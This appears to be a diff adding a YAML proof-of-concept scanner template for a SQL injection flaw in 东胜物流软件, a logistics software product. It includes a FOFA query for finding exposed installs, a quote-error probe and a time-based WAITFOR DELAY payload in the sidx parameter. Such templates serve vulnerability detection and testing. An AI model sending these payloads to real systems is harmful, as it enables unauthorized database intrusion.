@@ -1,0 +1,20 @@
+id: poc-yaml-dongshengsoft-htmlsearchservicelcl-aspx-sqli
+info:
+  name: 东胜物流软件 HtmlSearchServiceLCL.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 东胜物流软件
+  fofa: app="东胜物流软件-物流软件"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /PriceCarrier/HtmlSearchServiceLCL.aspx?page=1&rows=10&sidx=1'&sord=asc&searchField=&searchString=&searchOper=
+  expression: status_code == 500 && contains(body,"引号不完整")
+- method: GET
+  path: /PriceCarrier/HtmlSearchServiceLCL.aspx?page=1&rows=10&sidx=1;WAITFOR+DELAY+'0:0:{{.t1}}'--+-&sord=asc&searchField=&searchString=&searchOper=
+  expression: status_code == 200 && contains(body,"\"griddatas\":") && !contains(body,"<")
+    && duration > t1 && duration < t2
+transport: http
